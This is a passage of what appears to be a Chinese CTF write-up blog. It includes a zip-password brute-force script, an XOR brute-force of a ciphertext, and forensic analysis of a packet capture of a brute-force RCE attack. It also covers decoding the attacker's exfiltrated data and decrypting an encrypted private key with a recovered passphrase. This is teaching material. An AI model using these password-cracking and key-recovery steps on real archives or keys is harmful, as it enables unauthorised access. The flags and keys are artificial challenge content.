+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">    except</span><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit"> Exception</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> as</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB"> e</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">:</span></span>
+<span class="line"><span style="--shiki-light:#FE640B;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:inherit">        print</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-light-font-style:italic;--shiki-dark:#C792EA;--shiki-dark-font-style:inherit">f</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"读取密码文件出错：</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">file_path</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> - </span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">{</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">e</span><span style="--shiki-light:#EA76CB;--shiki-dark:#82AAFF">}</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        return</span><span style="--shiki-light:#FE640B;--shiki-dark:#FF5874"> None</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"># 示例使用</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">start_num </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 99</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">  # 文件名从zip_99开始</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">end_num </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 0</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">  # 文件名到zip_1结束</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">output_folder </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">extracted_files</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">  # 解压到的文件夹</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">password_log_file </span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">password_log.txt</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic">  # 保存密码的日志文件</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#B2CCD6">decrypt_multiple_zips</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF">start_num</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> end_num</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> output_folder</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D9F5DD">,</span><span style="--shiki-light:#4C4F69;--shiki-dark:#82AAFF"> password_log_file</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span></code></pre>
+<p>最终去<code>password_log.txt</code>中可以拿到一个全部16进制的数据，丢到010中16进制粘贴，改为png格式即可拿到二维码照片。
+<img src="https://static.synex.space/article/Pasted%20image%2020250117184235.png" alt="">
+扫描拿到<code>flag{_PASSWORDs_is_fl@g!_}</code></p>
+<h2 id="第1天-简单算术">第1天 简单算术</h2>
+<p>密文为<code>ys~xdg/m@]mjkz@vl@z~lf>b </code>
+脚本直接跑</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">s</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">ys~xdg/m@]mjkz@vl@z~lf>b </span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">for</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> i</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> in</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> range</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">1,</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 128</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">    result</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> ""</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">.join</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">chr(ord(c</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> ^</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> i</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">) </span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">for</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> c</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> in</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> s</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">    print</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">(</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">f</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">"i={i}: {result}"</span><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">)</span></span></code></pre>
+<p><img src="https://static.synex.space/article/Pasted%20image%2020250117160220.png" alt="">
+flag{x0r_Brute_is_easy!}</p>
+<h2 id="第2天-nethttp">第2天 NetHttP</h2>
+<p>先导出爆破成功的流量，脚本如下，具体的判断方式是返回数据包返回<code>rce</code>即成功，常规的这种爆破流量都是爆破成功后就不爆破了，这里是爆破成功了继续爆破每个字符都要从头到尾尝试一遍，通过下面脚本可以拿到所有相关的爆破成功的数据包，会导出到<code>./output</code>目录中</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">input_pcap</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">NetHttP.pcapng</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">output_dir</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">./output</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">mkdir</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -p</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$output_dir</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">output_prefix</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">stream_</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">stream_ids</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">$(</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">tshark</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -r</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$input_pcap</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -Y</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">http contains "rce" and ip.dst == 192.168.111.1</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -T</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> fields</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -e</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> tcp.stream</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> sort</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -u</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">if</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> [</span><span style="--shiki-light:#179299;--shiki-dark:#C792EA"> -z</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$stream_ids</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB"> ];</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> then</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">  echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">没有找到符合条件的流 ID。</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">  exit</span><span style="--shiki-light:#FE640B;--shiki-dark:#F78C6C"> 1</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">fi</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">for</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> stream_id</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> in</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478"> $stream_ids</span><span style="--shiki-light:#7C7F93;--shiki-dark:#D6DEEB">;</span><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> do</span></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">  echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">导出流 </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$stream_id</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">...</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">  tshark</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -r</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$input_pcap</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -Y</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">tcp.stream eq </span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$stream_id</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -w</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$output_dir</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#C5E478">$output_prefix$stream_id</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">.pcapng</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="--shiki-light:#8839EF;--shiki-light-font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">done</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">所有流的导出已完成。</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span></span></code></pre>
+<p>再通过下面命令把数据导出</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#637777;--shiki-dark-font-style:italic"># ~/Desktop/output 导出目录</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">cat</span><span style="--shiki-light:#4C4F69;--shiki-dark:#7FDBCA"> *</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">strings</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">grep</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> echo</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">awk</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -F</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">echo%20</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">{print $2}</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA">|</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">awk</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -F</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">%20</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">{print $1}</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> base64</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -d</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">  sed</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">s/fi/\n/g</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">awk</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -F</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">==</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">{print $3}</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">awk</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -F</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">'</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">{print $2}</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">sed</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> '</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">:a;N;$!ba;s/\n//g</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">'</span></span></code></pre>
+<p>返回内容为
+<img src="https://static.synex.space/article/Pasted%20image%2020250118142555.png" alt=""></p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="text"><code><span class="line"><span>UzBJM2lXaHZzektiT00vT2FsS1RBMGZwbTVPNWNoVlZuWUd5S2Q1blY0ZXJBelJiVjZWNnc4Yi9VaU9mUUVjM0lqaDAwaEZqWUZVMUhheE51YjlHbmxQUy9sY2FtNW1BVGtmMnNKUzZKZ3BKbzZBU2hWUnhXRFlLS3JvamVVZUJaajVNRVBJOC80REdHR3VIRnhteDJieEFhaGREZTFjR25qVFpHV09OcE5JPQ==RmFrZSBGTGFnCm5vIGhlcmUK</span></span></code></pre>
+<p>俩等于号之后的是从<code>/flag</code>中爆破的实际解密内容是假的flag,再看上面的数据
+<img src="https://static.synex.space/article/Pasted%20image%2020250118142708.png" alt="">
+解密数据为<code>S0I3iWhvszKbOM/OalKTA0fpm5O5chVVnYGyKd5nV4erAzRbV6V6w8b/UiOfQEc3Ijh00hFjYFU1HaxNub9GnlPS/lcam5mATkf2sJS6JgpJo6AShVRxWDYKKrojeUeBZj5MEPI8/4DGGGuHFxmx2bxAahdDe1cGnjTZGWONpNI=</code>再继续base64会发现都不是明文数据，从流量包尝试找其他内容，http的前几个数据包发现了一个被加密的私钥，如图内容如下
+<img src="https://static.synex.space/article/Pasted%20image%2020250118142825.png" alt=""></p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="log"><code><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">-----BEGIN ENCRYPTED PRIVATE KEY-----</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">MIIC1DBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIirzza4niI8QCAggA</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECEXSIcOIuwGaBIICgHLW3Qb39/+E</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">0uKiOi8yevcztF5toCOGsh6Fi23zSIwCjH8VPO1lbpFCkW9789ldbxBbSwtXwMmF</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">kTyFjOmymL/zktmt8PyExcWOGA481/IkpCPTmKAT8+67FJEdAf9BAZVPjqpu1Lla</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">Ohnp3JFZ8SStSUWwvjLZafi4Ucf7ajJexwCTkkvB7mF8kostYaBOsNJ1GORRdL3c</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">s73GxvX98MTLvF1DW5xujgdcl28msB3GHTxe7sSgScKfFUyfCViivW8FCqa6lfJo</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">Tj3JZtNlpPiOr1PXPfIWBt0wEQaF3+ovTEVu7x1r1Q3mq61GpO3s4n6kdeGg9Dkp</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">BYErmG76JdZtOWTZ88SrD7EDkh12EOdtM0ywR1DTYk4+fjKifkhPPrIGn8Nm07PE</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">yTAS7UG0Ut2Ut722rOBsgIZlnk2vF8qbIvKJj1JGzedMLabnafF5/L2N4wP8ZeL8</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">fO1Asxy0o/Hk89rl7ZI8Aocc1ZRMHKfxg/XV2bFHv2q1M1y3CI9wUrGnvk+8oX0H</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">T/5vFtfGb4QNiy+p6aTi+UEJOau5O0t4f2kAL6L/pgmLEMulKWVMK8u+p6os0cbt</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">KbVBmjNE/uA8SCv8E9XcL+/LWsSVInrYwJQzWbLIYx5FTRk4479taV3BGEN+hbmU</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">RqlIK8IwsVxWc4wC+oHoLMY4RllUZ9D2rBasMt6DOLA31Jjrabciv03zJPyqXcfi</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">DVTFu9JfT1fF7eOClQzTvIlTDVIDMPfAqR6B+/AbZDiQ2aK/54i10kohmXT2qWoT</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">pDYPWV2JGTXICaRyP8FYu26ZTdIKVB3PovfJEXR3yex14U5T8zFVpUQnoDJfNyPG</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">qUVmlGScmkU=</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#D6DEEB">-----END ENCRYPTED PRIVATE KEY-----</span></span></code></pre>
+<p>这是个被加密的私钥，找了好久的密钥发现了一个最像密钥的字符串<code>gdkfksy05lx0nv8dl</code>
+<img src="https://static.synex.space/article/Pasted%20image%2020250118142947.png" alt="">
+尝试通过下面命令解密</p>
+<pre class="astro-code astro-code-themes catppuccin-latte night-owl" style="--shiki-light:#4c4f69;--shiki-dark:#d6deeb;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#011627; overflow-x: auto;--file-name-offset: -0.75rem;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#D20F39;--shiki-light-font-style:italic;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD"> "</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D">gdkfksy05lx0nv8dl</span><span style="--shiki-light:#40A02B;--shiki-dark:#D9F5DD">"</span><span style="--shiki-light:#179299;--shiki-dark:#7FDBCA"> |</span><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> openssl</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> rsa</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -in</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> key.pem</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -out</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> decrypted_private_key.pem</span><span style="--shiki-light:#40A02B;--shiki-dark:#82AAFF"> -passin</span><span style="--shiki-light:#40A02B;--shiki-dark:#ECC48D"> stdin</span></span></code></pre>
+<p>拿到私钥
+<img src="https://static.synex.space/article/Pasted%20image%2020250118143104.png" alt=""></p>
